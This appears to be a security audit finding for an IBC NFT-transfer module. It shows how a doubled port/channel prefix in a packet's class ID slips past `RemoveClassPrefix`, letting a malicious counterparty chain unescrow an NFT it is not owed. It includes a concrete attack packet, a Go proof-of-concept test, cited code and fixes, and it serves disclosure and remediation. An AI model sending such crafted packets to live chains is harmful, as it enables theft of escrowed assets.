### Title
Crafted `data.ClassId` with Repeated Port/Channel Prefix Bypasses `RemoveClassPrefix`, Enabling Unauthorized Unescrow — (`x/nft-transfer/keeper/packet.go`, `x/nft-transfer/types/trace.go`)

---

### Summary

`RemoveClassPrefix` is an unchecked string-slice operation. A malicious counterparty chain can send a back-to-origin packet whose `data.ClassId` contains a doubled source-prefix (`p2/c2/p2/c2/base`). The receiving chain's `processReceivedPacket` strips only the first prefix segment, computes a *different* `voucherClassID` than the one originally escrowed, and calls `TransferOwner` against that different class — successfully unescrow-ing an NFT that belongs to a separate escrow obligation, breaking the escrow invariant.

---

### Finding Description

**`RemoveClassPrefix` — `x/nft-transfer/types/trace.go` lines 40–43**

```go
func RemoveClassPrefix(portID, channelID, classID string) string {
    classPrefix := GetClassPrefix(portID, channelID)
    return classID[len(classPrefix):]
}
```

This is a raw byte-offset slice. It removes exactly `len("portID/channelID/")` characters from the front of `classID` with no structural validation. [1](#0-0) 

**`processReceivedPacket` back-to-origin branch — `x/nft-transfer/keeper/packet.go` lines 186–201**

```go
} else {
    unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
        packet.GetSourceChannel(), data.ClassId)
    voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
    for _, tokenID := range data.TokenIds {
        if err := k.nftKeeper.TransferOwner(ctx,
            voucherClassID, tokenID, escrowAddress, receiver); err != nil {
            return err
        }
    }
}
```

The `voucherClassID` fed to `TransferOwner` is derived entirely from the attacker-controlled `data.ClassId` after a single prefix strip. [2](#0-1) 

**`ValidateBasic` — `x/nft-transfer/types/packet.go` lines 41–72**

The only check on `ClassId` is that it is non-blank. There is no structural validation of the path depth, no check that the prefix appears exactly once, and no check that the remaining path after stripping is consistent with any previously registered class trace. [3](#0-2) 

**`IsAwayFromOrigin` — `x/nft-transfer/types/trace.go` lines 49–52**

The back-to-origin branch is entered whenever `data.ClassId` merely *starts with* `sourcePort/sourceChannel/`. A doubled prefix `p2/c2/p2/c2/base` satisfies this check and routes execution into the unescrow path. [4](#0-3) 

---

### Impact Explanation

**Concrete state setup (all steps use normal IBC operations):**

| Step | Action | Chain A state |
|------|--------|---------------|
| 1 | Chain B sends `nftClass`/`tokenID` to chain A via `(p2,c2)→(p1,c1)` | Chain A mints `ibc/HASH1` = `ibc/{sha256("p2/c2/nftClass")}` |
| 2 | Chain A sends `ibc/HASH1`/`tokenID` back to chain B via `(p1,c1)` | `IsAwayFromOrigin("p1","c1","p2/c2/nftClass")` → true → **escrow** `ibc/HASH1`/`tokenID` at `GetEscrowAddress(p1,c1)` |

After step 2, chain A holds `ibc/HASH1`/`tokenID` in escrow at `GetEscrowAddress(p1,c1)`.

**Attack packet (sent by malicious chain B):**

```
data.ClassId  = "p2/c2/p2/c2/nftClass"
data.TokenIds = ["tokenID"]
data.Receiver = attacker_address
packet.SourcePort    = p2
packet.SourceChannel = c2
packet.DestPort      = p1
packet.DestChannel   = c1
```

**Execution on chain A:**

1. `IsAwayFromOrigin("p2","c2","p2/c2/p2/c2/nftClass")` → `"p2/c2/p2/c2/nftClass"` starts with `"p2/c2/"` → **false** → back-to-origin branch entered. [4](#0-3) 
2. `RemoveClassPrefix("p2","c2","p2/c2/p2/c2/nftClass")` → `"p2/c2/nftClass"` (strips only the first `len("p2/c2/")` bytes). [1](#0-0) 
3. `ParseClassTrace("p2/c2/nftClass").IBCClassID()` → `ibc/HASH1`. [5](#0-4) 
4. `escrowAddress = GetEscrowAddress(p1,c1)` — the same address where `ibc/HASH1`/`tokenID` was escrowed in step 2. [6](#0-5) 
5. `TransferOwner(ctx, "ibc/HASH1", "tokenID", escrowAddress, attacker_address)` → **succeeds**. [7](#0-6) 

**Result:** `ibc/HASH1`/`tokenID` is transferred to the attacker on chain A. Chain B still holds `ibc/HASH2` = `ibc/{sha256("p1/c1/p2/c2/nftClass")}`/`tokenID` (the voucher minted in step 2). The escrow invariant is broken: the NFT has been unescrow-ed without the corresponding voucher being burned, creating a double-spend across chains.

---

### Likelihood Explanation

The preconditions are:
1. **Malicious counterparty chain** — a chain B that commits a crafted packet. This is a standard IBC threat model: the receiving chain must validate packet data defensively because IBC core only verifies packet commitment proofs, not application-layer semantics.
2. **Target NFT in escrow** — chain A must have previously escrowed `ibc/HASH1`/`tokenID` at `GetEscrowAddress(p1,c1)`. This is a normal operational state that arises whenever chain A re-sends a received voucher back toward chain B.

Both conditions are reachable without any privileged access, governance action, or key compromise.

---

### Recommendation

1. **Validate prefix count in `RemoveClassPrefix`**: Before slicing, assert that `classID` starts with exactly one occurrence of `classPrefix` and that the remainder does not start with the same prefix again.
2. **Validate `data.ClassId` structure in `ValidateBasic`**: Parse the classID into a `ClassTrace` and call `ClassTrace.Validate()` to enforce that the path consists of valid, non-repeating port/channel pairs.
3. **Cross-check against registered class traces**: In the back-to-origin branch, verify that `unprefixedClassID` corresponds to a class trace that was previously registered on this chain (i.e., `HasClassTrace` for the computed hash), rejecting packets that reference unknown traces.

---

### Proof of Concept

```go
func TestCraftedClassIDUnescrowsWrongVoucher(t *testing.T) {
    // Setup: chain A has ibc/HASH1 (= ibc/{sha256("p2/c2/nftClass")}) escrowed
    // at GetEscrowAddress("p1","c1") because chain A previously re-sent it to chain B.

    escrowAddr := types.GetEscrowAddress("p1", "c1")
    // Mint ibc/HASH1 / tokenID and transfer to escrow (simulating step 2)
    nftKeeper.MintNFT(ctx, "ibc/HASH1", "tokenID", "", "", "", escrowAddr, escrowAddr)

    // Attacker sends crafted back-to-origin packet
    packet := channeltypes.Packet{
        SourcePort: "p2", SourceChannel: "c2",
        DestPort:   "p1", DestChannel:   "c1",
    }
    data := types.NonFungibleTokenPacketData{
        ClassId:   "p2/c2/p2/c2/nftClass", // doubled prefix
        TokenIds:  []string{"tokenID"},
        TokenUris: []string{""},
        Sender:    attackerAddr.String(),
        Receiver:  attackerAddr.String(),
    }

    err := keeper.OnRecvPacket(ctx, "ics721-1", packet, data)
    require.NoError(t, err) // succeeds — no validation blocks it

    // ibc/HASH1 / tokenID is now owned by attacker, not escrow
    nft, _ := nftKeeper.GetNFT(ctx, "ibc/HASH1", "tokenID")
    require.Equal(t, attackerAddr, nft.GetOwner()) // invariant broken
}
``` [8](#0-7) [9](#0-8)

### Citations

**File:** x/nft-transfer/types/trace.go (L40-52)
```go
func RemoveClassPrefix(portID, channelID, classID string) string {
	classPrefix := GetClassPrefix(portID, channelID)
	return classID[len(classPrefix):]
}

// IsAwayFromOrigin determine if non-fungible token is moving away from
// the origin chain (the chain issued by the native nft).
// Note that fullClassPath refers to the full path of the unencoded classID.
// The longer the fullClassPath, the farther it is from the origin chain
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
	prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
	return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

**File:** x/nft-transfer/types/trace.go (L61-75)
```go
func ParseClassTrace(rawClassID string) ClassTrace {
	classSplit := strings.Split(rawClassID, "/")

	if classSplit[0] == rawClassID {
		return ClassTrace{
			Path:        "",
			BaseClassId: rawClassID,
		}
	}

	return ClassTrace{
		Path:        strings.Join(classSplit[:len(classSplit)-1], "/"),
		BaseClassId: classSplit[len(classSplit)-1],
	}
}
```

**File:** x/nft-transfer/keeper/packet.go (L140-204)
```go
func (k Keeper) processReceivedPacket(ctx sdk.Context, packet channeltypes.Packet,
	data types.NonFungibleTokenPacketData,
) error {
	receiver, err := sdk.AccAddressFromBech32(data.Receiver)
	if err != nil {
		return err
	}

	isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)

	// create the escrow address for creating denom and minting nft
	escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())

	if isAwayFromOrigin {
		// since SendPacket did not prefix the classID, we must prefix classID here
		classPrefix := types.GetClassPrefix(packet.GetDestPort(), packet.GetDestChannel())
		// NOTE: sourcePrefix contains the trailing "/"
		prefixedClassID := classPrefix + data.ClassId

		// construct the class trace from the full raw classID
		classTrace := types.ParseClassTrace(prefixedClassID)
		if !k.HasClassTrace(ctx, classTrace.Hash()) {
			k.SetClassTrace(ctx, classTrace)
		}

		voucherClassID := classTrace.IBCClassID()

		if !k.nftKeeper.HasDenomID(ctx, voucherClassID) {
			if err := k.nftKeeper.IssueDenom(ctx, voucherClassID, voucherClassID, "", data.ClassUri, escrowAddress); err != nil {
				return err
			}
		}
		sdkCtx := sdk.UnwrapSDKContext(ctx)
		sdkCtx.EventManager().EmitEvent(
			sdk.NewEvent(
				types.EventTypeClassTrace,
				sdk.NewAttribute(types.AttributeKeyTraceHash, classTrace.Hash().String()),
				sdk.NewAttribute(types.AttributeKeyClassID, voucherClassID),
			),
		)

		for i, tokenID := range data.TokenIds {
			if err := k.nftKeeper.MintNFT(ctx, voucherClassID, tokenID, "", data.TokenUris[i], "", escrowAddress, receiver); err != nil {
				return err
			}
		}
	} else {
		// If the token moves in the direction of back to origin,
		// we need to unescrow the token and transfer it to the receiver

		// we should remove the prefix. For example:
		// p6/c6/p4/c4/p2/c2/nftClass -> p4/c4/p2/c2/nftClass
		unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
			packet.GetSourceChannel(), data.ClassId)

		voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
		for _, tokenID := range data.TokenIds {
			if err := k.nftKeeper.TransferOwner(ctx,
				voucherClassID, tokenID, escrowAddress, receiver); err != nil {
				return err
			}
		}
	}

	return nil
```

**File:** x/nft-transfer/types/packet.go (L41-44)
```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}
```
